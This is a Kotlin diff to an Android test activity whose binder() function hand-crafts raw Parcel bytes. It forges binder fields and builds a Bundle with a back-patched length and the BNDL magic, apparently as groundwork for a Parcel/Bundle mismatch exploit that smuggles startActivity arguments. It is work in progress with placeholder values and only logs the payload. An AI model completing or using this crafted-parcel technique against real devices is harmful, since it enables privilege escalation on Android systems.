@@ -1,5 +1,8 @@
+@file:OptIn(ExperimentalUnsignedTypes::class)
+
 package play.ground
 
+import android.annotation.SuppressLint
 import android.app.ActivityOptions
 import android.content.Intent.FLAG_ACTIVITY_NEW_TASK
 import android.os.Bundle
@@ -11,9 +14,12 @@ import kotlinx.coroutines.launch
 import org.jetbrains.anko.button
 import org.jetbrains.anko.sdk27.coroutines.onClick
 import org.jetbrains.anko.verticalLayout
-import java.nio.ByteBuffer
 
 fun UInt.repeat(n: Int) = UByteArray(n) { this.toUByte() }
+fun <T> fixme(value: T) = value
+
+const val ValByteArray = 13
+
 
 class IndexActivity : AppCompatActivity() {
   companion object {
@@ -177,32 +183,72 @@ class IndexActivity : AppCompatActivity() {
   }
 
 
+  @SuppressLint("Recycle")
   fun binder() {
-    val binderHead = ubyteArrayOf(
-//      1u, 0u, 0u, 0u, // Span.type(1) -> binder.flags
+    val `spanMeta$resultTo$head` = ubyteArrayOf(
+      1u, 0u, 0u, 0u, // Span.type(1) -> binder.flags
       3u, 2u, 1u, 0u // String.length(?) -> binder.1@i32
     )
 
-    val binderTail = ubyteArrayOf(
-      0u, 0u, 0u, 0u, // Span.str.payload.0123 -> binder.2@i32
+    val `span$resultTo$tail` = ubyteArrayOf(
+      0u, 0u, 0u, 0u, //
       *0u.repeat(8), // Span.str.payload.4567_8901 ->  cookie@i64
       *0u.repeat(4), // Span.str.payload2.2345 -> representation
     )
 
+    val `span$resultWho` = byteArrayOf(-1, -1, -1, -1) // null
+    val `span$requestCode` = byteArrayOf(-1, 0, 0, 0) // -1, LE
+    val `span$flags` = byteArrayOf(0x10, 0, 0, 0) // FLAG_ACTIVITY_NEW_TASK
+    val `span$profilerInfo` = byteArrayOf(0, 0, 0, 0) // profilerInfo == null
 
-    val parcel = Parcel.obtain()
-    parcel.writeByteArray((binderHead + binderTail).toByteArray())
-    parcel.setDataPosition(0)
-    val binder = parcel.readStrongBinder()
-    Log.e(TAG, "binder: $binder")
+    val prologue = Parcel.obtain().apply {
+      writeInt(0)
+      // Span.str.payload.0123 -> resultTo.binder.2@i32
 
+      writeInt(0)
+      writeInt(0)
+      // Span.str.payload.4567_8901 -> resultTo.binder.cookie@i64
+
+      writeInt(0)
+      // Span.str.payload2.2345 -> resultTo.binder.representation
+    }
+
+    val epilogue = Parcel.obtain().apply {
+      writeInt(0) // i32@LabeledIntent.mIcon
+      writeString(null) // resolvedType
+      writeStrongBinder(null) // resultTo
+      writeString(null) // resultWho
+      writeInt(2) // requestCode
+      writeTypedObject(null, 0) // profilerInfo
+      writeTypedObject(null, 0) // options
+    }
+
+    val epilogueLength = epilogue.dataPosition()
+
+    val `span$options$map` = Parcel.obtain().apply {
+      writeInt(2) // entry size
+      writeString("android.activity.launchTaskId") // first key
+      writeValue(1)
+      writeString("?")
+      writeInt(ValByteArray)
+      writeInt(fixme(epilogueLength)) // length of epilogue
+    }
+
+    val `span$options$meta` = Parcel.obtain().apply {
+      writeInt(1) // options != null
+      writeInt(fixme(`span$options$map`.dataPosition() + epilogueLength)) // back-patched length
+      writeInt(0x4C444E42) // BNDL
+    }
+
+    val payload = String(
+      Parcel.obtain().apply {
+        appendFrom(prologue, 0, prologue.dataSize())
+        appendFrom(`span$options$meta`, 0, `span$options$meta`.dataSize())
+        appendFrom(`span$options$map`, 0, `span$options$map`.dataSize())
+      }.marshall()
+    )
+    Log.e(TAG, "natsuki: payload -> $payload")
   }
-
-
-  // key =>
-  // (260 header) + bytes = > form to entry
-
-
 }
 
 
